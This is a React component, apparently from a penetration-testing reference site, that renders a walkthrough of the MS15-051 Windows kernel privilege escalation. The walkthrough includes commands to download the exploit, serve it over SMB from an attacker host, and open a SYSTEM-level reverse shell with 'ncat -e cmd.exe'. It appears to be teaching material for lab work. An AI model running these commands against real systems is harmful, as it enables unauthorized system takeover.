import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import Link from "next/link";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";

interface IProps {
  title: string;
}

const MS15_051 = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Requirements</Typography>
            <Typography>Windows 8.1 (and before)</Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Description</Typography>
            <Typography>
              A privilege escalation vulnerability exists due to the Win32k.sys
              kernel-mode driver improperly handling objects in memory. A local
              attacker can exploit this flaw, via a specially crafted
              application, to execute arbitrary code in kernel mode.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1</Typography>
            <Typography>
              Download the privilege escalation executable
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS15-051/MS15-051-KB3045171.zip"
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 2</Typography>
            <Typography>Start an smbserver</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"smbserver.py kali ."}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 3</Typography>
            <Typography>Execute `ms15-051x64.exe` </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {'\\\\10.10.14.2\\kali\\ms15-051x64.exe "whoami"'}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 4</Typography>
            <Typography>
              The above command can only execute one command as system. We want
              to spawn a reverse shell as system.{" "}
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                '\\\\10.10.14.2\\kali\\ms15-051x64.exe "\\\\10.10.14.2\\kali\\ncat.exe -e cmd.exe 10.10.14.2 5555"'
              }
            </SyntaxHighlighter>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default MS15_051;
